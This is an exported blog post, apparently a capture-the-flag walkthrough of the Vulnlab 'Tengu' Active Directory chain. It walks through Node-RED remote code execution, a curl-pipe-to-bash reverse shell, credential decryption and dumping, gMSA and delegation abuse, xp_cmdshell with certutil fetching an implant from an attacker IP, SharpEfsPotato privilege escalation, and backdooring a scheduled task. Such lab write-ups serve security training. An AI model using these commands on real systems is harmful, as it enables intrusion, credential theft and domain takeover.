a DA and that we verified that we are a DA within the DC, we can view the contents of the Administrator's directory on the DC through CIFS.\n\n```\nPS C:\\temp> cat \\\\dc.tengu.vl\\C$\\Users\\Administrator\\Desktop\\root.txt\nVL{...snip...}\n```\n\n# Conclusion\n\nThis means we have successfully rooted this machine! Big thanks to r0BIT for the development of this chain, it helped me strengthen a lot of the AD privilege escalation core fundamentals that I had learned about previously.\n\n![](/images/vulnlab/tengu-vl/p.jpg)\n\n# Resources\n\nhttps://nodered.org/#:~:text=Node%2DRED%20is%20a%20programming,runtime%20in%20a%20single%2Dclick.\nhttps://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/\nhttps://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/\nhttps://www.revshells.com/\nhttps://github.com/BishopFox/sliver\nhttps://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13\nhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server\nhttps://hashes.com/en/tools/hash_identifier\nhttps://github.com/sosdave/KeyTabExtract\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/bugch3ck/SharpEfsPotato\nhttps://github.com/ParrotSec/mimikatz","source":"_posts/tengu.md","raw":"---\ntitle: Tengu - Vulnlab\ndate: 2024-06-05 16:27:23\ntags: [vulnlab, Medium, CHAIN]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Linux, Windows'\ndescription: This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.\ncover: /images/vulnlab/tengu-vl/tengu_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis was my first step into a three-machine chain on VulnLab, and I want to thank r0BIT on the development of this chain and all of the work that was developed for this chain. It involves exploiting a domain-joined Linux machine and pivoting through MSSQL, finally leading to the DC after.\n\n# Enumeration\n\nUpon doing our first scans, we can see that there are three machines that collectively have either RDP or SSH on them. There's also another port on `.183` denoted as `VSAT-CONTROL` on port 1880, though this seems to be the only other port that is available.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:01 EDT\nNmap scan report for 10.10.187.181\nHost is up (0.11s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 22.28 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:01 EDT\nNmap scan report for 10.10.187.182\nHost is up (0.11s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 22.45 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:02 EDT\nNmap scan report for 10.10.187.183\nHost is up (0.11s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n1880/tcp open  vsat-control\n\nNmap done: 1 IP address (1 host up) scanned in 15.46 seconds\n```\n\nUsually these chains start with the machine that has the highest number in the IP address, being `.183` in our case. We'll try to look into these a little more to see if there are any other services. We can start by examining the `vsat-control` service, as I've found that it's being hosted on a front-end web application.\n\n# Node-RED RCE\n\nUpon accessing the website, we can see that we are greeted with the `Node-RED` service.\n\n![](/images/vulnlab/tengu-vl/b.jpg)\n\nThis seems to be interconnected with an `MSSQL` service, however I'm assuming that the databases are only accessible on the back-end, since we did not see them on our initial scan.\n\nNode-RED seems to be a programming tool for wiring APIs and devices together through a centralized service. The interface that we are currently interacting with is a flow diagram to which maps out different services in a stream-lined fashion. This specific web application seems to utilize JavaScript functions within the flow diagram editor for easier template and function usage. The most up-to-date version of Node-RED seems to be v3.1.9, however you'll notice from the menu that we're currently on v3.1.6.\n\nA good way to think about this is that you can map the connections between devices and how they're used. It's essentially like drawing diagrams in Paint or Microsoft Visio, except those figures that you use are services and web-apps. The application itself is publicly accessible since it does not enforce any form of authentication into the web service.\n\nIn the flow diagram that we have access to, there are four different figures for us to look at; `timestamp`, `SQL`, `Pull_Data`, and `/tmp/output`. We also see underneath the `SQL` node that there seems to be a connection error between this web service and `sql.tengu.vl:1433`, which my guess is the domain name of one of the machines. I've done some research and found that MSSQL can run on Linux (which is the OS of the machine we're on), though most don't recommend it in a production environment.\n\nI found some resources about this specific service and how to exploit it, notably by `qkaiser` in [this article](https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/). This involves utilizing the `exec` node to trigger arbitrary command execution through the debug console.\n\nTo test this functionality, I spun up a simple Python server on my localhost with `http://(IP):9001/` and created a node flow that executed an arbitrary command via the `exec` and `debug` nodes. To test this, I just had the `exec`  node make a request with `curl` towards our Python server.\n\n![](/images/vulnlab/tengu-vl/c.jpg)\n\nUpon saving our changes and deploying the flow diagram, we'll run our nodes to execute the command, which we can see runs successfully in based on the captured request.\n\n![](/images/vulnlab/tengu-vl/d.jpg)\n\nNow that we verified that we have remote code execution, we can attempt to execute a payload. `qkaiser` developed a proof-of-concept that we can utilize to get remote code execution, which you can find in the article I have referenced above.\n\nThe proof-of-concept itself seems to be explained thoroughly, as it essentially checks if there are any authentication requirements such as using credentials or requiring a token to the service to run. If those checks are passed, it will perform the following:\n\n* Create a timestamp node and attach an exec block to it.\n* Listen for any requests through a web socket\n* Execute the exec block and catch the web socket request after it is triggered.\n* Provide a terminal UI that allows us to interact with the reverse shell when it is generated.\n\nThe only requirement we need to provide the proof-of-concept with is the URL to the web service (since there is no authentication required on our behalf).\n\n![](/images/vulnlab/tengu-vl/e.jpg)\n\nThe socket that opens up for us seems to have some odd behavior, so I decided to set up a simple reverse shell and use `curl http:(IP):(PORT)/rev.sh | bash` to this machine to execute (I used [revshells](https://www.revshells.com/) for `rev.sh` which just as a bash one-liner). You can do what you'd like, however this seemed to work for me - which afterwards I stood up a [Sliver](https://github.com/BishopFox/sliver) server and executed an implant which would provide me with a Sliver session on the remote host.\n\n(Note that the file named `tengu` is my sliver implant)\n\n# NODERED$ Host Reconnaissance\n\n![](/images/vulnlab/tengu-vl/f.jpg)\n\nSo this user seems to have their own home directory, however I noticed that there is no user flag in their home folder. This means we'll need to escalate our privileges to the next user in order to do this.\n\nI immediately started to look into the `.node-red` directory, as it seems to be the only unusual file in the users home folder. This directory housed a file that we can use to potentially escalate privileges - `flows_cred.json`.\n\n# Decrypting Flow Creds\n\nThere is a hash in `flows_cred.json` that is unrecognized by tools like `hashcat` and `JTR`, so we'll need to decrypt them in some way. Doing some research into this file led me to discover that there is a key for this hash located within `.config.runtime.json` (I used [this article](https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/) as reference for how to decrypt it). Essentially the key within the config file is hashed with SHA256 and is passed into the `decryptCredentials()` function, to which the key is then used to alter the first 32 characters of the hash.\n\nThe proof-of-concept provided in the article decrypts the hash using `openssl` and reconverts the first 32 characters that have been altered by the respective function. I did some altering to the proof-of-concept that it provided, and ran it locally as the `jq` dependency was not available on the remote host. (All credit for the below code goes to HugoPoi in their article and for the development of the code.)\n\n```\n└─$ cat dec_flow_creds.sh      \n#!/bin/bash\n#\n# Decrypt flows_cred.json from a NodeRED data directory\n#\n# Usage\n# ./node-red-decrypt-flows-cred.sh ./node_red_data\n#\njq  '.[\"$\"]' -j $1flows_cred.json | \\\n  cut -c 33- | \\\n  openssl enc -aes-256-ctr -d -base64 -A -iv `jq  -r '.[\"$\"]' $1flows_cred.json | cut -c 1-32` -K `jq -j '._credentialSecret' $1.config.runtime.json | sha256sum | cut -c 1-64`\n```\n\nThis leaves us with the following response after decrypting the hash.\n\n```\n└─$ ./dec_flow_creds.sh       \n{\"d237b4c16a396b9e\":{\"username\":\"nodered_connector\",\"password\":\"[...snip...]\"}}\n```\n\nWe have found creds for a user, however you'll notice that this does not seem to belong to a user on the host machine. The only other user that we are able to authenticate to is `labadmin`, who probably has the user flag within their home folder.\n\n# Enabling MSSQL Database Connection on NODERED$\n\nI checked for credential reusage for any of the users through SSH or RDP on the other machines, however came back with no results. Given the name of the user `nodered_connector`, we can guess that these creds still belong to the Node-RED service.\n\nIf we remember originally from the start of the box, there was an MSSQL node that was failing from one of the flow diagrams in Node-RED. If we take a look back at this, we can edit the SQL node information and we'll find the same `nodered_connector` auto-filled into the credential option for this node. Entering our creds into this will cause the node error to disappear after deploying the diagram.\n\n![](/images/vulnlab/tengu-vl/g.jpg)\n\nFrom here, we can determine whether or not we can access the MSSQL database by setting up a SOCKS proxy on the `.183` machine we have access to. Sliver has a built-in SOCKS5 proxy functionality, so we'll use that alongside `proxychains`.\n\n```\nsliver (tengu) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081\n```\n\nWe'll then need to change our `/etc/proxychains4.conf` file to reflect this SOCKS proxy and connect to it.\n\n```\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\nsocks5  127.0.0.1 1081\n```\n\nNow that we have access via the proxy, we can attempt to find the MSSQL service on `sql.tengu.vl` by trying to NMAP to all of the machines for it.\n* `proxychains4 nmap 10.10.187.183 -p1433 && proxychains4 nmap 10.10.187.182 -p1433 && proxychains4 nmap 10.10.187.183 -p1433`\n\nWe'll see that we receive a hit on `10.10.187.182`. This means we should be able to authenticate to MSSQL on `.182` with the `nodered_connector` creds that we have. We'll do so with Impacket.\n\n```\n└─$ proxychains4 impacket-mssqlclient -dc-ip 10.10.187.181 -target-ip 10.10.187.182 TENGU/'nodered_connector':'[...snip...]'@10.10.187.182\n```\n\n![](/images/vulnlab/tengu-vl/h.jpg)\n\n# MSSQL Database Enumeration\n\nNow that we have access to the MSSQL service, we can look around each database to find any credentials for any other users. This [HackTricks article](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) helped with utilizing a few MSSQL queries.\n\nIn the `Demo` database, there is a user hash for `t2_m.winters`. \n\n```\nSQL (nodered_connector  nodered_connector@Demo)> SELECT * FROM Users;\n  ID   Username          Password                                                              \n----   ---------------   -------------------------------------------------------------------   \nNULL   b't2_m.winters'   b'[...snip...]'\n```\n\nI couldn't find any success in using `JTR` or `Hashcat` with this hash, however I used the hash cracker on this [website](https://hashes.com/en/tools/hash_identifier) and found the respective credentials for this user.\n\nIf you'll notice in the `/home/tengu.vl` directory on the Linux machine, the user has a home folder within this directory. Even though this user is not within the `/etc/passwd` file (which would normally indicate to us that they are not an actual user on this system), we can still login as them using `su t2_m.winters` within the Linux machine.\n\n```\nnodered_svc@nodered:/tmp$ su t2_m.winters@tengu.vl\nPassword: \nt2_m.winters@tengu.vl@nodered:/tmp$\n```\n\nAfter logging in, we can see that we have permissions to run everything as root with `sudo -l` and `t2_m.winters` password. This means we can gain root access with `sudo su` and locate the first flag within `/root/root.txt`.\n\n# Pivoting to SQL$\n\nJust for some due diligence that I learned when doing the Hybrid chain a while back, I extracted `/etc/krb5.keytab` to my local machine and decrypted it using [KeyTabExtract](https://github.com/sosdave/KeyTabExtract). This will give us the NTLM hash of the `NODERED$` machine account.\n\n```\n[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.\n[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.\n[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.\n[+] Keytab File successfully imported.\n        REALM : TENGU.VL\n        SERVICE PRINCIPAL : NODERED$/\n        NTLM HASH : [...snip...]\n        AES-256 HASH : [...snip...]\n        AES-128 HASH : [...snip...]\n```\n\nWhether or not we'll need this is really up to the box. That being said, you'll notice on the Wiki that it's telling us to utilize delegation for our next vector. Originally I thought we'd do this to access `.182`, however it seems that machine was only used for the `MSSQL` purpose that we needed it for before, as it doesn't seem to have anything else useful for us right now.\n\nRunning `crackmapexec` through our DC seems to let us know that we have valid credentials to LDAP on the DC with `t2_m.winters`.\n\n```\n└─$ proxychains4 crackmapexec ldap 10.10.187.181 -u 't2_m.winters' -p '[...snip...]'                                              \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:389  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:135  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK\nSMB         10.10.187.181   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  DC.tengu.vl:389  ...  OK\nLDAP        10.10.187.181   389    DC               [+] tengu.vl\\t2_m.winters:[...snip...]\n```\n\nNote that I did take a break here for the day, so the IP addresses will change. The new chain addresses will vary.\n\nNow that we have valid credentials to LDAP as a user, we can dump the domain using [Bloodhound](https://github.com/dirkjanm/BloodHound.py).\n\nIn the Bloodhound GUI, I couldn't find anything out of the ordinary for the `t2_m.winters`. They are a valid user to the LDAP service on the DC, but they don't seem to have anything else. Let's take a look at the machine account `NODERED$` that we currently have an NTLM hash for.\n\n![](/images/vulnlab/tengu-vl/i.jpg)\n\n# ReadGMSAPassword on GMSA01$\n\nIt seems that our machine account `NODE-RED$` is a part of the `LINUX_SERVER` domain group, which has `ReadGMSAPassword` over `GMSA01$@tengu.vl`. This essentially means that we can read the respective password for this user as our `NODERED$` machine account. We can do so with crackmapexec.\n\n```\n└─$ proxychains4 crackmapexec ldap dc.tengu.vl -u 'NODERED$' -H [...snip...] --gmsa\n\nSMB         dc.tengu.vl     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  DC.tengu.vl:636  ...  OK\nLDAP        dc.tengu.vl     636    DC               [+] tengu.vl\\NODERED$:[...snip...] \nLDAP        dc.tengu.vl     636    DC               [*] Getting GMSA Passwords\nLDAP        dc.tengu.vl     636    DC               Account: gMSA01$              NTLM: [...snip...]\n```\n\nNow that we have credentials to this user, we can check what we can access to as this user in Bloodhound.\n\n![](/images/vulnlab/tengu-vl/j.jpg)\n\nOur user `GMSA01$`, has constrained delegation rights on the SQL machine, `sql.tengu.vl`. This means that we are allowed to authenticate as any user to specific services (more than likely MSSQL in our case) onto this machine. We can also impersonate domain admins, meaning that we can potentially compromise this entire host just from this privilege.\n\nThe victim in our case will be the SPN `MSSQLSvc/sql.tengu.vl` and will request a TGT for that SPN before using S4U2Self/S4U2Proxy to impersonate the user we are requesting for.\n\nNote that we won't be able to impersonate the Administrator as we only have an SPN for MSSQLSvc. You can verify the SPN by running LDAPSearch to query the domain with `t2_m.winters` credentials..\n\n```\n└─$ proxychains4 ldapsearch -LLL -x -H 'ldap://10.10.138.229' -D 't2_m.winters@tengu.v' -w 'Tengu123' -b \"dc=tengu,dc=vl\" \"(&(objectClass=User)(msDS-AllowedToDelegateTo=*))\"\n\n[...snip...]\nservicePrincipalName: MSSQLSvc/SQL.tengu.vl:1433\nservicePrincipalName: MSSQLSvc/SQL.tengu.vl\nobjectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat\n ion,DC=tengu,DC=vl\n [...snip...]\n```\n\nSo we'll need to find another user we can impersonate. If we had an SPN for CIFS, then we might be able to impersonate Administrator. That being said, if we look at the available users on `sql.tengu.vl`, we can try to find a few to impersonate.\n\n![](/images/vulnlab/tengu-vl/k.jpg)\n\nYou'll notice that there is a DA on this machine, though using `impacket-getST` does not let me impersonate them. this is due to them being within the `Protected Users` group, meaning we can not request a MSSQL service ticket as them.\n\nIf you didn't notice, there is an SQL Admins group that appear in the search bar. Investigating into this group gives me the impression that `t1_m.winters` is a valid user we can potentially try.\n\n```\n└─$ proxychains4 impacket-getST -spn 'MSSQLSvc/sql.tengu.vl' 'tengu.vl/GMSA01$@sql.tengu.vl' -hashes :[...snip...] -dc-ip 10.10.138.229 -impersonate 't1_m.winters'\n\n└─$ export KRB5CCNAME=t1_m.winters@MSSQLSvc_sql.tengu.vl@TENGU.VL.ccache\n\n└─$ proxychains4 impacket-mssqlclient -k sql.tengu.vl\nSQL (TENGU\\t1_m.winters  dbo@master)>\n```\n\n# SQL$ MSSQL XP Cmdshell\n\nWe are able to successfully authenticate as this user into the MSSQL service and can now enumerate a little further into what we can achieve. It seems that we have the ability to run commands if we use `enable_xp_cmdshell` and `xp_cmdshell`, which means we now have code execution on the second machine.\n\nI also tested for AMSI with `xp_cmdshell \"powershell -e SW52b2tlLU1pbWlrYXR6\"`, it seems that AV is not enabled on this machine. In that case we can try to curl our Sliver payload to this machine and execute it.\n\n```\nSQL (TENGU\\t1_m.winters  dbo@master)> xp_cmdshell powershell \"cd ..\\..; mkdir temp; cd C:\\temp; certutil.exe -urlcache -f http://10.8.0.173:9001/sql_tengu.exe sql_tengu.exe; .\\sql_tengu.exe\"\n```\n\nWe should now have proper code execution as the `gMSA01$` user, as denoted below.\n\n![](/images/vulnlab/tengu-vl/l.jpg)\n\n# Impersonating SYSTEM with SharpEfsPotato\n\nIf you'll notice, this user has `SeImpersonatePrivilege`, meaning we can impersonate SYSTEM and spawn a named pipe onto PowerShell, which we can then run our `sql_tengu` binary again to get a session as SYSTEM. We'll use [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) for this and can get a SYSTEM shell relatively easily. Note that I tried doing this through Sliver's UI, and was running into a token error. I dropped it locally to `sql.tengu.vl` and it seemed to work as intended.\n\n```\nPS C:\\temp> .\\SharpEfsPotato.exe -p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"cd C:\\temp; .\\sql_tengu.exe\" \n\nSharpEfsPotato by @bugch3ck\n  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.\n\n  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.\n\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/b9f1bb62-6bd4-4aa0-90d1-cca939fb5983/\\b9f1bb62-6bd4-4aa0-90d1-cca939fb5983\\b9f1bb62-6bd4-4aa0-90d1-cca939fb5983\ndf1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:\n[x]RpcBindingSetAuthInfo failed with status 0x6d3\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n[*] Session 2debc8b7 sql_tengu - 10.10.138.230:49693 (SQL) - windows/amd64 - Tue, 28 May 2024 14:34:18 EDT\n```\n\nWe can now view the second flag which is within `C:\\Users\\Administrator\\Desktop`.\n\n# Pivoting to the DC\n\nNow that we have a SYSTEM shell on this machine, we can essentially dump all credentials on this machine with [Mimikatz](https://github.com/ParrotSec/mimikatz). Before we do this though, I went to verify if there were any users that we could potentially look at to pivot to the DC.\n\n![](/images/vulnlab/tengu-vl/m.jpg)\n\nIt seems that `T0_C.FOWLER` can do this, who is also a part of the `T0_Admins` domain group. If we are able to get their credentials, we may be able to authenticate to the DC and go from there. I also reset my SOCKS5 proxy to the SYSTEM session that we have right now just for due diligence, it shouldn't really matter that much as far as I'm concerned.\n\n# Scheduled Task Exploitation\n\nDoing some enumeration, I couldn't find much with PowerView. I then moved onto scheduled tasks, which showed some promise. Enumerating scheduled tasks can be done with the following: `schtasks /query /v /fo LIST > tasklist.txt` \n\n![](/images/vulnlab/tengu-vl/n.jpg)\n\nThere's a task file denoted as `C:\\admin\\Task.ps1` that seems to be ran as `t0_c.fowler`, which is the user we are trying to escalate as. If we plant a reverse shell or attempt to execute our Sliver binary, we should be able to get a session as this user once this task is executed. (I just added `Start-Process \"C:\\temp\\sql_tengu.exe\"` to the bottom of the file.)\n\nYou'll notice though that this task is being ran once every day. We'll need to speed this up. We can do so by forcing Task Scheduler to restart the task, by executing: `Get-ScheduledTask -TaskName \"Daily_Checkup\" | Start-ScheduledTask`\n\nAfter waiting about a minute, we should get a new session as `c.fowler`.\n\n![](/images/vulnlab/tengu-vl/o.jpg)\n\nNow that we are a DA and that we verified that we are a DA within the DC, we can view the contents of the Administrator's directory on the DC through CIFS.\n\n```\nPS C:\\temp> cat \\\\dc.tengu.vl\\C$\\Users\\Administrator\\Desktop\\root.txt\nVL{...snip...}\n```\n\n# Conclusion\n\nThis means we have successfully rooted this machine! Big thanks to r0BIT for the development of this chain, it helped me strengthen a lot of the AD privilege escalation core fundamentals that I had learned about previously.\n\n![](/images/vulnlab/tengu-vl/p.jpg)\n\n# Resources\n\nhttps://nodered.org/#:~:text=Node%2DRED%20is%20a%20programming,runtime%20in%20a%20single%2Dclick.\nhttps://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/\nhttps://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/\nhttps://www.revshells.com/\nhttps://github.com/BishopFox/sliver\nhttps://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13\nhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server\nhttps://hashes.com/en/tools/hash_identifier\nhttps://github.com/sosdave/KeyTabExtract\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/bugch3ck/SharpEfsPotato\nhttps://github.com/ParrotSec/mimikatz","slug":"tengu","published":1,"updated":"2024-06-05T20:39:53.579Z","comments":1,"layout":"post","photos":[],"_id":"clx2amfuw0000w8uf2ychh0z6","content":"<p>This was my first step into a three-machine chain on VulnLab, and I want to thank r0BIT on the development of this chain and all of the work that was developed for this chain. It involves exploiting a domain-joined Linux machine and pivoting through MSSQL, finally leading to the DC after.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Upon doing our first scans, we can see that there are three machines that collectively have either RDP or SSH on them. There’s also another port on <code>.183</code> denoted as <code>VSAT-CONTROL</code> on port 1880, though this seems to be the only other port that is available.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:01 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.187.181</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 999 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:01 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.187.182</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 999 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:02 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.187.183</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 999 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">1880/tcp open  vsat-control</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 15.46 seconds</span><br></pre></td></tr></table></figure>\n\n<p>Usually these chains start with the machine that has the highest number in the IP address, being <code>.183</code> in our case. We’ll try to look into these a little more to see if there are any other services. We can start by examining the <code>vsat-control</code> service, as I’ve found that it’s being hosted on a front-end web application.</p>\n<h1 id=\"Node-RED-RCE\"><a href=\"#Node-RED-RCE\" class=\"headerlink\" title=\"Node-RED RCE\"></a>Node-RED RCE</h1><p>Upon accessing the website, we can see that we are greeted with the <code>Node-RED</code> service.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/b.jpg\"></p>\n<p>This seems to be interconnected with an <code>MSSQL</code> service, however I’m assuming that the databases are only accessible on the back-end, since we did not see them on our initial scan.</p>\n<p>Node-RED seems to be a programming tool for wiring APIs and devices together through a centralized service. The interface that we are currently interacting with is a flow diagram to which maps out different services in a stream-lined fashion. This specific web application seems to utilize JavaScript functions within the flow diagram editor for easier template and function usage. The most up-to-date version of Node-RED seems to be v3.1.9, however you’ll notice from the menu that we’re currently on v3.1.6.</p>\n<p>A good way to think about this is that you can map the connections between devices and how they’re used. It’s essentially like drawing diagrams in Paint or Microsoft Visio, except those figures that you use are services and web-apps. The application itself is publicly accessible since it does not enforce any form of authentication into the web service.</p>\n<p>In the flow diagram that we have access to, there are four different figures for us to look at; <code>timestamp</code>, <code>SQL</code>, <code>Pull_Data</code>, and <code>/tmp/output</code>. We also see underneath the <code>SQL</code> node that there seems to be a connection error between this web service and <code>sql.tengu.vl:1433</code>, which my guess is the domain name of one of the machines. I’ve done some research and found that MSSQL can run on Linux (which is the OS of the machine we’re on), though most don’t recommend it in a production environment.</p>\n<p>I found some resources about this specific service and how to exploit it, notably by <code>qkaiser</code> in <a href=\"https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/\">this article</a>. This involves utilizing the <code>exec</code> node to trigger arbitrary command execution through the debug console.</p>\n<p>To test this functionality, I spun up a simple Python server on my localhost with <code>http://(IP):9001/</code> and created a node flow that executed an arbitrary command via the <code>exec</code> and <code>debug</code> nodes. To test this, I just had the <code>exec</code>  node make a request with <code>curl</code> towards our Python server.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/c.jpg\"></p>\n<p>Upon saving our changes and deploying the flow diagram, we’ll run our nodes to execute the command, which we can see runs successfully in based on the captured request.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/d.jpg\"></p>\n<p>Now that we verified that we have remote code execution, we can attempt to execute a payload. <code>qkaiser</code> developed a proof-of-concept that we can utilize to get remote code execution, which you can find in the article I have referenced above.</p>\n<p>The proof-of-concept itself seems to be explained thoroughly, as it essentially checks if there are any authentication requirements such as using credentials or requiring a token to the service to run. If those checks are passed, it will perform the following:</p>\n<ul>\n<li>Create a timestamp node and attach an exec block to it.</li>\n<li>Listen for any requests through a web socket</li>\n<li>Execute the exec block and catch the web socket request after it is triggered.</li>\n<li>Provide a terminal UI that allows us to interact with the reverse shell when it is generated.</li>\n</ul>\n<p>The only requirement we need to provide the proof-of-concept with is the URL to the web service (since there is no authentication required on our behalf).</p>\n<p><img src=\"/images/vulnlab/tengu-vl/e.jpg\"></p>\n<p>The socket that opens up for us seems to have some odd behavior, so I decided to set up a simple reverse shell and use <code>curl http:(IP):(PORT)/rev.sh | bash</code> to this machine to execute (I used <a href=\"https://www.revshells.com/\">revshells</a> for <code>rev.sh</code> which just as a bash one-liner). You can do what you’d like, however this seemed to work for me - which afterwards I stood up a <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> server and executed an implant which would provide me with a Sliver session on the remote host.</p>\n<p>(Note that the file named <code>tengu</code> is my sliver implant)</p>\n<h1 id=\"NODERED-Host-Reconnaissance\"><a href=\"#NODERED-Host-Reconnaissance\" class=\"headerlink\" title=\"NODERED$ Host Reconnaissance\"></a>NODERED$ Host Reconnaissance</h1><p><img src=\"/images/vulnlab/tengu-vl/f.jpg\"></p>\n<p>So this user seems to have their own home directory, however I noticed that there is no user flag in their home folder. This means we’ll need to escalate our privileges to the next user in order to do this.</p>\n<p>I immediately started to look into the <code>.node-red</code> directory, as it seems to be the only unusual file in the users home folder. This directory housed a file that we can use to potentially escalate privileges - <code>flows_cred.json</code>.</p>\n<h1 id=\"Decrypting-Flow-Creds\"><a href=\"#Decrypting-Flow-Creds\" class=\"headerlink\" title=\"Decrypting Flow Creds\"></a>Decrypting Flow Creds</h1><p>There is a hash in <code>flows_cred.json</code> that is unrecognized by tools like <code>hashcat</code> and <code>JTR</code>, so we’ll need to decrypt them in some way. Doing some research into this file led me to discover that there is a key for this hash located within <code>.config.runtime.json</code> (I used <a href=\"https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/\">this article</a> as reference for how to decrypt it). Essentially the key within the config file is hashed with SHA256 and is passed into the <code>decryptCredentials()</code> function, to which the key is then used to alter the first 32 characters of the hash.</p>\n<p>The proof-of-concept provided in the article decrypts the hash using <code>openssl</code> and reconverts the first 32 characters that have been altered by the respective function. I did some altering to the proof-of-concept that it provided, and ran it locally as the <code>jq</code> dependency was not available on the remote host. (All credit for the below code goes to HugoPoi in their article and for the development of the code.)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat dec_flow_creds.sh      </span><br><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">#</span><br><span class=\"line\"># Decrypt flows_cred.json from a NodeRED data directory</span><br><span class=\"line\">#</span><br><span class=\"line\"># Usage</span><br><span class=\"line\"># ./node-red-decrypt-flows-cred.sh ./node_red_data</span><br><span class=\"line\">#</span><br><span class=\"line\">jq  &#x27;.[&quot;$&quot;]&#x27; -j $1flows_cred.json | \\</span><br><span class=\"line\">  cut -c 33- | \\</span><br><span class=\"line\">  openssl enc -aes-256-ctr -d -base64 -A -iv `jq  -r 